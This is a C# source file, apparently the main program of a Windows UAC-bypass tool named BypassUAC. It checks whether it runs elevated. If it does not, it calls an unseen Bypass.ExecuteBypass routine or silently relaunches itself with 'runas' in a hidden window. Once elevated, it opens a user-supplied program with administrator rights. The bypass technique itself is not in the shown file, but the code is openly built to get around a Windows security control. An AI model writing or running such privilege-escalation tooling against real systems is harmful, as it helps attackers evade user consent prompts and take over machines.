using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace BypassUAC
{
	class Program
	{
		[DllImport("shell32.dll", CharSet = CharSet.Auto)]
		private static extern bool ShellExecuteEx(ref SHELLEXECUTEINFO lpExecInfo);

		[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
		private struct SHELLEXECUTEINFO
		{
			public int cbSize;
			public uint fMask;
			public IntPtr hwnd;
			[MarshalAs(UnmanagedType.LPTStr)]
			public string lpVerb;
			[MarshalAs(UnmanagedType.LPTStr)]
			public string lpFile;
			[MarshalAs(UnmanagedType.LPTStr)]
			public string lpParameters;
			[MarshalAs(UnmanagedType.LPTStr)]
			public string lpDirectory;
			public int nShow;
			public IntPtr hInstApp;
			public IntPtr lpIDList;
			[MarshalAs(UnmanagedType.LPTStr)]
			public string lpClass;
			public IntPtr hkeyClass;
			public uint dwHotKey;
			public IntPtr hIcon;
			public IntPtr hProcess;
		}

		private const int SW_SHOWNORMAL = 1;
		private const int SW_HIDE = 0;

		static void Main(string[] args)
		{
			if (Bypass.IsElevated())
			{
				Console.Write("Target path: ");
				string path = Console.ReadLine();
				Console.WriteLine($"Target Program: {path}");

				SHELLEXECUTEINFO sei = new SHELLEXECUTEINFO
				{
					cbSize = Marshal.SizeOf(typeof(SHELLEXECUTEINFO)),
					lpVerb = "open",
					lpFile = path,
					hwnd = IntPtr.Zero,
					nShow = SW_SHOWNORMAL,
					lpParameters = "/k"
				};

				ShellExecuteEx(ref sei);
				Console.WriteLine("Press any key to continue...");
				Console.ReadKey();
			}
			else
			{
				if (Bypass.GetOSVersion())
				{
					Bypass.ExecuteBypass();
				}
				else
				{
					// runas로 재실행
					string currentExe = System.Reflection.Assembly.GetExecutingAssembly().Location;

					SHELLEXECUTEINFO sei = new SHELLEXECUTEINFO
					{
						cbSize = Marshal.SizeOf(typeof(SHELLEXECUTEINFO)),
						lpVerb = "runas",
						lpFile = currentExe,
						hwnd = IntPtr.Zero,
						nShow = SW_HIDE,
						lpParameters = null
					};

					ShellExecuteEx(ref sei);
				}
				Environment.Exit(0);
			}
		}
	}
}
